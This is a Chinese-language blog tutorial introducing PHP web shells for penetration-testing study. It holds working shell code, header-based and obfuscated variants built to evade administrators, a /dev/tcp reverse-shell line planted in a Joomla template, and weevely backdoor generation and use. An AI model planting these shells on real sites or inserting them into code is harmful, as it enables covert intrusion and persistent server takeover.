@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Bantian">
+
+
+
+
+
+<title>Web Shell入门学习 | Bantian</title>
+
+
+
+    <link rel="icon" href="/my.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Web Shell入门学习</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">2020-08-01&nbsp;&nbsp;17:43:00</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="什么是Web-Shell"><a href="#什么是Web-Shell" class="headerlink" title="什么是Web Shell"></a>什么是Web Shell</h2><p>在渗透测试中，对于一个远程服务器，攻击者往往会从目标主机上的http服务入手，先控制靶机上的网站，然后纵向渗透获取服务器的更高权限。为了获取对目标Web应用程序的持久访问，攻击者通常会选择上传恶意脚本，这个恶意脚本就是web shell，但是web shell本身是不能攻击或是利用远程Web应用的漏洞的。</p>
+<h2 id="最简单的Web-Shell"><a href="#最简单的Web-Shell" class="headerlink" title="最简单的Web Shell"></a>最简单的Web Shell</h2><p>如下所示是一个最简单的Web Shell：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system($_GET[<span class="string">'cmd'</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>通过一个get请求参数<code>cmd</code>，就可以让目标靶机执行系统命令，但是一些情况下，为了系统安全，可能会禁用一些函数，可以这样测试什么函数被禁用了：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">print_r(preg_grep(<span class="string">"/^(system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)$/"</span>, get_defined_functions(<span class="keyword">TRUE</span>)[<span class="string">"internal"</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/01/WebShell-1/imgs/1.png" alt="1"></p>
+<h2 id="隐藏Web-Shell"><a href="#隐藏Web-Shell" class="headerlink" title="隐藏Web Shell"></a>隐藏Web Shell</h2><p>太简单的Web Shell很容易被有经验的管理员发现，所以攻击者开始寻找方法来隐藏自己上传到目标服务器上的Web Shell。</p>
+<h3 id="修改http-headers"><a href="#修改http-headers" class="headerlink" title="修改http headers"></a>修改http headers</h3><p>第一种方式是通过http header来传参，而不是直接通过<code>$_POST</code>或是<code>$_GET</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">system($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/01/WebShell-1/imgs/2.png" alt="2"></p>
+<p>但针对Web服务的入侵痕迹检测，可以通过分析日志文件来检测，比如apache服务的日志文件access.log的默认路径为<code>/var/log/apache2/access.log</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.247.196 - - [01&#x2F;Aug&#x2F;2020:11:10:12 +0800] &quot;GET &#x2F;test.php HTTP&#x2F;1.1&quot; 200 414 &quot;-&quot; &quot;Mozilla&#x2F;5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko&#x2F;20100101 Firefox&#x2F;75.0&quot;</span><br><span class="line">192.168.247.196 - - [01&#x2F;Aug&#x2F;2020:11:30:56 +0800] &quot;GET &#x2F;test.php HTTP&#x2F;1.1&quot; 200 214 &quot;-&quot; &quot;cat &#x2F;etc&#x2F;passwd&quot;</span><br></pre></td></tr></table></figure>
+
+<p>当管理员查看日志文件的时候很容易看出有不正常的流量。</p>
+<p>另一种方式是利用<code>$_SERVER[&#39;HTTP_ACCEPT_LANGUAGE&#39;]</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">system($_SERVER[<span class="string">'HTTP_ACCEPT_LANGUAGE'</span>]);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/01/WebShell-1/imgs/3.png" alt="3"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.247.196 - - [01&#x2F;Aug&#x2F;2020:13:04:36 +0800] &quot;GET &#x2F;test.php HTTP&#x2F;1.1&quot; 200 638 &quot;-&quot; &quot;Mozilla&#x2F;5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko&#x2F;20100101 Firefox&#x2F;75.0&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="修改已存在的文件"><a href="#修改已存在的文件" class="headerlink" title="修改已存在的文件"></a>修改已存在的文件</h3><p>绝大数的PHP shell都是使用<code>c99</code>，<code>r57</code>，<code>b374</code>或是它们的变种，但是现在的免杀比较容易发现它们，所以一种比较好的隐藏方式是直接将web shell嵌入到已经存在的合法的文件中，比如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.example.com/index.php</span></span><br><span class="line">http:<span class="comment">//www.example.com/about.php</span></span><br></pre></td></tr></table></figure>
+
+<p>对于一个cms，比如joomla，可以直接嵌在模板代码中：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$option   = $app-&gt;input-&gt;getCmd(<span class="string">'option'</span>, <span class="string">''</span>);</span><br><span class="line">$view     = $app-&gt;input-&gt;getCmd(<span class="string">'view'</span>, <span class="string">''</span>);</span><br><span class="line">......</span><br><span class="line">$itemid   = $app-&gt;input-&gt;getCmd(<span class="string">'task'</span>, <span class="string">''</span>);</span><br><span class="line">$sitename = $app-&gt;get(<span class="string">'sitename'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// web shell</span></span><br><span class="line">system (<span class="string">"bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.247.210/23333 0&gt;&amp;1'"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($task === <span class="string">'edit'</span> || $layout === <span class="string">'form'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $fullWidth = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $fullWidth = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/01/WebShell-1/imgs/4.png" alt="4"></p>
+<p>访问<code>index.php</code>，监听23333端口，成功反弹shell：</p>
+<p><img src="/2020/08/01/WebShell-1/imgs/5.png" alt="5"></p>
+<h3 id="代码混淆"><a href="#代码混淆" class="headerlink" title="代码混淆"></a>代码混淆</h3><p>为了避免web shell被管理员发现，或是被别的攻击者发现利用，出现为他人做嫁衣这种情况，攻击者不断想出更复杂的方法来隐藏他们的代码，代码混淆就是其中一种。</p>
+<p>代码混淆有这么几种方式：</p>
+<h4 id="Whitespace"><a href="#Whitespace" class="headerlink" title="Whitespace"></a>Whitespace</h4><p>去掉了空格之后，代码的可读性就下降了：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// Whitespace makes things easy to read </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myshellexec</span><span class="params">($cmd)</span></span>&#123;</span><br><span class="line"> <span class="keyword">global</span> $disablefunc; $result = <span class="string">""</span>;</span><br><span class="line"> <span class="keyword">if</span> (!<span class="keyword">empty</span>($cmd))&#123;</span><br><span class="line"> <span class="keyword">if</span> (is_callable(<span class="string">"exec"</span>) &amp;&amp; !in_array(<span class="string">"exec"</span>,$disablefunc)) &#123;</span><br><span class="line"> exec($cmd,$result); $result = join(<span class="string">""</span>,$result);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125; </span><br><span class="line"><span class="comment">// Whitespace removed makes things harder to read </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myshellexec</span><span class="params">($cmd)</span> </span>&#123;<span class="keyword">global</span> $disablefunc;$result = <span class="string">""</span>;</span><br><span class="line"> <span class="keyword">if</span>(!<span class="keyword">empty</span>($cmd)) &#123; <span class="keyword">if</span> (is_callable(<span class="string">"exec"</span>) <span class="keyword">and</span></span><br><span class="line"> !in_array(<span class="string">"exec"</span>,$disablefunc))&#123;exec($cmd,$result); $result=join(<span class="string">" "</span>,$result);&#125;&#125;&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Scrambling"><a href="#Scrambling" class="headerlink" title="Scrambling"></a>Scrambling</h4><p>Scrambling就是置乱，可以有效地与其他技术结合使用，以帮助web shell不被发现，这种方式可以打乱代码使其的可读性大大下降，并使用各种函数<strong>在运行时重构代码</strong>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Scrambled</span></span><br><span class="line">  $k=<span class="string">'c3lzdGVtKCdscyAtbGEnKTs='</span>;$c=strrev(<span class="string">'(edoced_46esab.""nruter'</span>).<span class="string">"'"</span>.$k.<span class="string">"');"</span>;$f=<span class="keyword">eval</span>($c);<span class="keyword">eval</span>($f);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Unscrambled</span></span><br><span class="line">  <span class="comment">// base_64 encoded string -&gt; system('ls -la');</span></span><br><span class="line">  $k=<span class="string">'c3lzdGVtKCdscyAtbGEnKTs='</span>;</span><br><span class="line">  <span class="comment">// strrev() reverses a given string:   strrev('(edoced_46esab.""nruter')."'".$k."')</span></span><br><span class="line">$c= <span class="keyword">eval</span>(<span class="string">"return base64_decode('c3lzdGVtKCdscyAtbGEnKTs=');"</span>);</span><br><span class="line">  <span class="comment">// $c = system('ls -la');</span></span><br><span class="line">  $f=<span class="keyword">eval</span>($c);</span><br><span class="line">  <span class="keyword">eval</span>($f);</span><br></pre></td></tr></table></figure>
+
+<h4 id="Encoding-Compression-and-Replacement-Techniques"><a href="#Encoding-Compression-and-Replacement-Techniques" class="headerlink" title="Encoding, Compression, and Replacement Techniques"></a>Encoding, Compression, and Replacement Techniques</h4><p>除了置乱Scrambling之外，还可以通过编码，替换，压缩等方式来使代码的可读性下降，从而达到隐藏web shell真实意图的目的。</p>
+<p><code>base64</code>：PHP中的base64加密函数为<code>base64_encode</code>，解码函数为<code>base64_decode</code></p>
+<p><code>gzdeflate</code>：PHP的压缩函数，可以使用<code>gzinflate</code>解压被压缩的字符串</p>
+<p><code>str_rot13</code>：对字符串执行 ROT13 编码，该编码把每一个字母在字母表中向前移动 13 个字母，数字和非字母字符保持不变</p>
+<p><img src="/2020/08/01/WebShell-1/imgs/6.png" alt="6"></p>
+<h4 id="Hex"><a href="#Hex" class="headerlink" title="Hex"></a>Hex</h4><p>ASCII字符的Hex值可以进一步用于混淆web shell命令，以下面的字符串为例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">'ls -al'</span>);</span><br></pre></td></tr></table></figure>
+
+<p>编码后的结果为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">73797374656d28276c73202d616c27293b</span><br></pre></td></tr></table></figure>
+
+<p>一个简单的例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">// function that accepts a hex encoded data</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dcd</span><span class="params">($hex)</span></span>&#123;</span><br><span class="line"><span class="comment">// split $hex</span></span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; strlen($hex)<span class="number">-1</span>; $i+=<span class="number">2</span>)&#123; </span><br><span class="line"><span class="comment">//run hexdec on every two characters to get their decimal representation which will be then used by char() to find the corresponding ASCII character</span></span><br><span class="line">$string .= chr(hexdec($hex[$i].$hex[$i+<span class="number">1</span>])); </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// evaluate/execute the command </span></span><br><span class="line"><span class="keyword">eval</span>($string); </span><br><span class="line">&#125; </span><br><span class="line">dcd(<span class="string">'73797374656d28276c73202d616c27293b'</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/01/WebShell-1/imgs/7.png" alt="7"></p>
+<p>除了以上的几种使用编码的方式隐藏web shell之外，攻击者还可能尝试加密的方法。</p>
+<h2 id="weevely"><a href="#weevely" class="headerlink" title="weevely"></a>weevely</h2><p>weevely是一个轻量级的类似PHP telnet的web shell，攻击者可以利用weevely创建后门代理，只需要指定一个密码和文件名。</p>
+<p>使用方法为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">weevely generate &lt;password&gt; &lt;path&gt;</span><br><span class="line">weevely &lt;URL&gt; &lt;password&gt; [cmd]</span><br></pre></td></tr></table></figure>
+
+<p>首先生成带验证的web shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./weevely.py generate 123456 shell.php</span></span><br><span class="line">Generated 'shell.php' with password '123456' of 690 byte size.</span><br></pre></td></tr></table></figure>
+
+<p>生成的web shell是这样的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">arch@arch:/<span class="keyword">var</span>/www/html$ cat shell.php </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$t=<span class="string">'or($!i=0;$i&lt;$l;)&#123;fo!r(!$!j=0;($j!&lt;$c&amp;&amp;$i&lt;$l);$j!++,$!i++)&#123;$o.!=$t&#123;$!i&#125;^$k&#123;'</span>;</span><br><span class="line">$W=<span class="string">'$j&#125;!;&#125;!&#125;!return $o;&#125;if (!!@p!reg_match!("!/$!kh(.+)$k!f/",@file_ge!t_conte'</span>;</span><br><span class="line">$j=str_replace(<span class="string">'d'</span>,<span class="string">''</span>,<span class="string">'crdedadted_fudnctdion'</span>);</span><br><span class="line">$p=<span class="string">'!$k="e10!adc39";$k!h="49ba!59abbe56!"!;$kf="e057f20!f!88!3e";$p="SU!hsg4osD'</span>;</span><br><span class="line">$r=<span class="string">'n();$r!=@base6!4_enco!d!e(@x(@gzcom!p!ress($o),$!k));pr!i!nt("$p$kh$r!$kf");&#125;'</span>;</span><br><span class="line">$d=<span class="string">'RWC!!H8GK";fu!nctio!n x($t,$k)!&#123;!$c!=!st!rlen!($k)!;$l=strlen($t);$!o="";f'</span>;</span><br><span class="line">$E=<span class="string">'nts("!!php://i!npu!t"),$m)=!=1) &#123;@ob_sta!rt();@e!!val(@gzun!!compress(@x(@'</span>;</span><br><span class="line">$c=<span class="string">'ba!!!se64_dec!!ode!($m[1]),!$k))!)!;$o=@ob_get_contents();@o!b_end_c!lea'</span>;</span><br><span class="line">$D=str_replace(<span class="string">'!'</span>,<span class="string">''</span>,$p.$d.$t.$W.$E.$c.$r);</span><br><span class="line">$U=$j(<span class="string">''</span>,$D);$U();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>将web shell上传到目标站点后，再利用weevely连接：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">arch@arch:~/weevely3$ ./weevely.py http://192.168.247.196/shell.php 123456</span><br><span class="line"></span><br><span class="line">[+] weevely 4.0.1</span><br><span class="line"></span><br><span class="line">[+] Target:	192.168.247.196</span><br><span class="line">[+] Session:	/home/arch/.weevely/sessions/192.168.247.196/shell_0.session</span><br><span class="line"></span><br><span class="line">[+] Browse the filesystem or execute commands starts the connection</span><br><span class="line">[+] to the target. Type :help for more information.</span><br><span class="line"></span><br><span class="line"><span class="meta">weevely&gt;</span><span class="bash"> uname -r</span></span><br><span class="line">4.15.0-96-generic</span><br><span class="line">www-data@arch:/var/www/html $</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
+<li><p><strong>Part 1</strong>  <a href="https://www.acunetix.com/blog/articles/introduction-web-shells-part-1/" target="_blank" rel="noopener">An Introduction to Web Shells</a></p>
+</li>
+<li><p><strong>Part 2</strong>  <a href="https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/" target="_blank" rel="noopener">Web Shells 101 Using PHP</a> </p>
+</li>
+<li><p><strong>Part 3</strong>  <a href="https://www.acunetix.com/blog/articles/keeping-web-shells-undercover-an-introduction-to-web-shells-part-3/" target="_blank" rel="noopener">Keeping Web Shells Under Cover</a> </p>
+</li>
+<li><p><strong>Part 4</strong>  <a href="https://www.acunetix.com/blog/articles/web-shells-action-introduction-web-shells-part-4/" target="_blank" rel="noopener">Web Shells in Action</a> </p>
+</li>
+</ol>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Bantian</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://bantttian.github.io/2020/08/01/WebShell-1/">https://bantttian.github.io/2020/08/01/WebShell-1/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>早睡早起身体好</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/WebShell/"># WebShell</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/07/30/%5BCCS16%5DCHAINSAW/">CCS16 & Chainsaw-Chained Automated Workflow-based Exploit Generation</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
